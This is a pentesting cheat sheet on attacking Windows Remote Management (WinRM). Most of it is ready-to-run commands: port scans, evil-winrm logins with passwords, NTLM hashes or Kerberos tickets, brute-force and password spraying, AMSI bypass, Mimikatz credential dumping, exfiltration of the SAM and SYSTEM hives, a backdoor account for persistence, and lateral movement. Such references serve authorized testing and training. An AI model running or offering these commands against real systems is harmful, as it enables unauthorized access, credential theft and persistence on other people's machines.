# Port 5985/5986 - WinRM

## Table of Contents

- [Enumeration](#enumeration)
  - [Port Scanning](#port-scanning)
  - [Nmap Scripts](#nmap-scripts)
- [Connection](#connection)
  - [Evil-WinRM](#evil-winrm)
  - [PowerShell Remoting](#powershell-remoting)
  - [Ruby WinRM](#ruby-winrm)
- [Brute Force](#brute-force)
- [Evil-WinRM Commands](#evil-winrm-commands)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)

| Reference | Link |
| :-------- | :--- |
| Hackviser | <https://hackviser.com/tactics/pentesting/services/winrm> |
| HackTricks | <https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm> |

---

## Enumeration

### Port Scanning

> WinRM ports: 5985 (HTTP), 5986 (HTTPS)

```shell
nmap -p 5985,5986 -sV $rhost
```

### Nmap Scripts

> WinRM authentication enumeration

```shell
nmap -p 5985 --script http-auth $rhost
```

> Check if WinRM is enabled

```shell
nmap -p 5985,5986 --script wmi-* $rhost
```

---

## Connection

### Evil-WinRM

> Connect with password

```shell
evil-winrm -i $rhost -u $username -p $password
```

> Connect with NTLM hash (Pass-the-Hash)

```shell
evil-winrm -i $rhost -u $username -H $ntlm_hash
```

> Connect with Kerberos ticket

```shell
evil-winrm -i $rhost -r $domain
```

> Connect with SSL (port 5986)

```shell
evil-winrm -i $rhost -u $username -p $password -S
```

> Connect with custom scripts/binaries

```shell
evil-winrm -i $rhost -u $username -p $password -s /path/to/scripts/ -e /path/to/binaries/
```

### PowerShell Remoting

> Enable PSRemoting on local machine

```powershell
Enable-PSRemoting -Force
```

> Connect from Windows

```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName $rhost -Credential $cred
```

> Invoke command remotely

```powershell
Invoke-Command -ComputerName $rhost -Credential $cred -ScriptBlock { whoami }
```

> Create persistent session

```powershell
$session = New-PSSession -ComputerName $rhost -Credential $cred
Enter-PSSession $session
```

### Ruby WinRM

> Ruby script for WinRM connection

```ruby
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://$rhost:5985/wsman',
  user: '$username',
  password: '$password'
)

conn.shell(:powershell) do |shell|
  output = shell.run('whoami')
  puts output.stdout
end
```

---

## Brute Force

### Nmap (Recommended)

> Nmap WinRM brute force

```shell
nmap -p 5985 --script http-brute --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

### NetExec

> NetExec WinRM password spray

```shell
nxc winrm $rhost -u users.txt -p passwords.txt
```

> Check credentials

```shell
nxc winrm $rhost -u $username -p $password
```

> With hash

```shell
nxc winrm $rhost -u $username -H $ntlm_hash
```

### Metasploit

> Metasploit WinRM login scanner

```shell
use auxiliary/scanner/winrm/winrm_login
set RHOSTS $rhost
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## Evil-WinRM Commands

### File Transfer

> Upload file to target

```shell
upload /local/path/file.exe C:\Windows\Temp\file.exe
```

> Download file from target

```shell
download C:\Users\Administrator\Desktop\flag.txt /tmp/flag.txt
```

### Execution

> Load and execute PowerShell script

```shell
# Load scripts from -s directory
Bypass-4MSI
. ./Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds
```

> Execute binary from -e directory

```shell
Invoke-Binary /path/to/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

### Evil-WinRM Enumeration

> List services

```shell
services
```

> Show available commands

```shell
menu
```

### Bypass Techniques

> Bypass AMSI

```shell
Bypass-4MSI
```

> Bypass execution policy

```shell
Dll-Loader /path/to/payload.dll
```

---

## Exploitation

> **📖 For complete WinRM lateral movement techniques, see [Lateral Movement - WinRM](../../5.Lateral-Movement/5.1.Lateral-Movement.md#winrm)**

### Pass-the-Hash

> Connect with NTLM hash

```shell
evil-winrm -i $rhost -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Kerberos Authentication

> Export Kerberos ticket and connect

```shell
export KRB5CCNAME=/path/to/ticket.ccache
evil-winrm -i $rhost -r $domain
```

### Command Execution via WMI

> Alternative command execution

```shell
wmic /node:$rhost /user:$username /password:$password process call create "cmd.exe /c whoami > C:\output.txt"
```

---

## Post-Exploitation

> **📖 For credential extraction techniques, see [Password Attacks](../../3.AD-Exploit/3.2.Password-Attacks.md#credential-dumping)**

### Credential Extraction

> Dump SAM via evil-winrm

```shell
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
download C:\Windows\Temp\SAM /tmp/SAM
download C:\Windows\Temp\SYSTEM /tmp/SYSTEM
```

> Extract hashes locally

```shell
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### Persistence

> Add WinRM user

```powershell
net user winrm_user Password123! /add
net localgroup "Remote Management Users" winrm_user /add
```

### Lateral Movement

> Execute on multiple hosts

```powershell
$hosts = @("host1", "host2", "host3")
$cred = Get-Credential
Invoke-Command -ComputerName $hosts -Credential $cred -ScriptBlock { hostname }
```

### Useful Paths

```text
# WinRM configuration
C:\Windows\System32\winrm\

# PowerShell transcription logs
C:\Users\*\Documents\PowerShell_transcript*

# Event logs
C:\Windows\System32\winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx
```
